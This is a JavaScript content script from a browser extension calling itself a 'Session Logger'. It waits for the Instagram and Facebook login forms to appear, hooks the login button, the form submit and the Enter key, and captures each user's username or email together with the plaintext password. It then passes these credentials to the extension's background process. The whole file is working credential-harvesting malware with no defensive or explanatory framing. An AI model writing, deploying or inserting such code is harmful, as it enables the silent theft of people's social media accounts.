console.log(
  "%c╔══════════════════════════════════════════════════════════════╗",
  "color: #9c27b0; font-weight: bold;"
);
console.log(
  "%c║            SESSION LOGGER CONTENT SCRIPT LOADED              ║",
  "color: #9c27b0; font-weight: bold;"
);
console.log(
  "%c╚══════════════════════════════════════════════════════════════╝",
  "color: #9c27b0; font-weight: bold;"
);

let lastSentInstagramData = { username: "", password: "" };
let lastSentFacebookData = { email: "", password: "" };

if (location.hostname.includes("instagram.com")) {
  console.log("%c[IG] Scanning for login form...", "color: #e91e63; font-weight: bold;");

  let igTries = 0;
  const igMaxTries = 25;

  const sniffInstagramLogin = setInterval(() => {
    igTries++;

    const usernameInput = document.querySelector("input[name='username']");
    const passwordInput = document.querySelector("input[name='password']");
    const loginBtn = document.querySelector("button[type='submit']:not([disabled])");

    if (usernameInput && passwordInput && loginBtn) {
      console.log("%c[IG] Login form detected", "color: #4caf50; font-weight: bold;");

      const handleInstagramLogin = () => {
        const username = usernameInput.value.trim();
        const password = passwordInput.value;

        if (!username || !password || username.length < 3 || password.length < 6) {
          console.log(
            "%c[IG] VALIDATION: Username >=3, password >=6 required",
            "color: #ff9800;"
          );
          return;
        }

        if (lastSentInstagramData.username === username && lastSentInstagramData.password === password) {
          console.log("%c[IG] SKIP: Same data as last sent", "color: #9e9e9e;");
          return;
        }

        lastSentInstagramData = { username, password };

        console.log("%c[IG] Sending login credentials...", "color: #e91e63; font-weight: bold;");
        console.table({ username, password: "***hidden***" });

        chrome.runtime.sendMessage({
          type: "instagram_login_data",
          data: { username, password },
        });
      };

      loginBtn.addEventListener("click", handleInstagramLogin, { capture: true });

      const form = loginBtn.closest("form");
      if (form) {
        form.addEventListener("submit", handleInstagramLogin, { capture: true });
      }

      passwordInput.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          handleInstagramLogin();
        }
      });

      clearInterval(sniffInstagramLogin);
    }

    if (igTries >= igMaxTries) {
      clearInterval(sniffInstagramLogin);
      console.log("%c[IG] Login form not found (not on login page)", "color: #9e9e9e;");
    }
  }, 700);
}

if (location.hostname.includes("facebook.com")) {
  console.log("%c[FB] Scanning for login form...", "color: #1877f2; font-weight: bold;");

  let fbTries = 0;
  const fbMaxTries = 25;

  const sniffFacebookLogin = setInterval(() => {
    fbTries++;

    const emailInput = document.querySelector("input[name='email'], input#email");
    const passwordInput = document.querySelector("input[name='pass'], input#pass");
    const loginBtn = document.querySelector("button[name='login'], button[type='submit'], input[type='submit'][value='Log In'], [data-testid='royal_login_button']");

    if (emailInput && passwordInput && loginBtn) {
      console.log("%c[FB] Login form detected", "color: #4caf50; font-weight: bold;");

      const handleFacebookLogin = () => {
        const email = emailInput.value.trim();
        const password = passwordInput.value;

        if (!email || !password || email.length < 3 || password.length < 6) {
          console.log(
            "%c[FB] VALIDATION: Email >=3, password >=6 required",
            "color: #ff9800;"
          );
          return;
        }

        if (lastSentFacebookData.email === email && lastSentFacebookData.password === password) {
          console.log("%c[FB] SKIP: Same data as last sent", "color: #9e9e9e;");
          return;
        }

        lastSentFacebookData = { email, password };

        console.log("%c[FB] Sending login credentials...", "color: #1877f2; font-weight: bold;");
        console.table({ email, password: "***hidden***" });

        chrome.runtime.sendMessage({
          type: "facebook_login_data",
          data: { email, password },
        });
      };

      loginBtn.addEventListener("click", handleFacebookLogin, { capture: true });

      const form = loginBtn.closest("form") || emailInput.closest("form");
      if (form) {
        form.addEventListener("submit", handleFacebookLogin, { capture: true });
      }

      passwordInput.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          handleFacebookLogin();
        }
      });

      clearInterval(sniffFacebookLogin);
    }

    if (fbTries >= fbMaxTries) {
      clearInterval(sniffFacebookLogin);
      console.log("%c[FB] Login form not found (not on login page)", "color: #9e9e9e;");
    }
  }, 700);
}
